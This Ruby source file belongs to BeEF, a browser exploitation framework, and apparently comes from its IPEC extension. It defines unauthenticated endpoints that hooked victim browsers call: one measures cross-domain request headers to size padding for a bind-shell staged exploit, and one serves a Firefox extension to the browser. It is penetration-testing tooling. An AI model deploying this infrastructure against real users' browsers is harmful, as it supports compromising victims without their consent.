#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#

module BeEF
  module Extension
    module Ipec
      class IpecRest < BeEF::Core::Router::Router

        before do
          # NOTE: the method exposed by this class are NOT-AUTHENTICATED.
          # They need to be called remotely from a hooked browser.

          #error 401 unless params[:token] == config.get('beef.api_token')
          #halt 401 if not BeEF::Core::Rest.permitted_source?(request.ip)
          headers 'Content-Type' => 'application/json; charset=UTF-8',
                  'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        # Determine the exact size of the cross-domain request HTTP headers.
        # Needed to calculate junk properly and prevent errors.
        # See modules/exploits/beefbind/beef_bind_staged_deploy/command.js for more info.
        # todo: the core of this method should be moved to ../junk_calculator.rb
        get '/junk/:name' do
           socket_name = params[:name]
           halt 401 if not BeEF::Filters.alphanums_only?(socket_name)
           socket_data = BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.get_socket_data(socket_name)
           halt 404 if socket_data == nil

           if socket_data.include?("\r\n\r\n")
              result = Hash.new

              headers = socket_data.split("\r\n\r\n").first
              BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket(socket_name)
              print_info "[IPEC] Cross-domain XmlHttpRequest headers size - received from bind socket [#{socket_name}]: #{headers.size + 4} bytes."
              # CRLF -> 4 bytes
              result['size'] = headers.size + 4

              headers.split("\r\n").each do |line|
                if line.include?("Host")
                  result['host'] = line.size + 2
                end
                if line.include?("Content-Type")
                  result['contenttype'] = line.size + 2
                end
                if line.include?("Referer")
                  result['referer'] = line.size + 2
                end
              end
              result.to_json
           else
             print_error "[IPEC] Looks like there is no CRLF in the data received!"
             halt 404
           end
        end


        # The original Firefox Extension sources are in extensions/ipec/files/LinkTargetFinder dir.
        # If you want to modify the pref.js file, do the following to re-pack the extension:
        # $cd firefox_extension_directory
        # $zip -r ../result-name.xpi *
        get '/ff_extension' do
          response['Content-Type'] = "application/x-xpinstall"
          ff_extension = "#{File.expand_path('../../../ipec/files', __FILE__)}/LinkTargetFinder.xpi"
          print_info "[IPEC] Serving Firefox Extension: #{ff_extension}"
          send_file "#{ff_extension}",
                    :type => 'application/x-xpinstall',
                    :disposition => 'inline'
        end

      end
    end
  end
end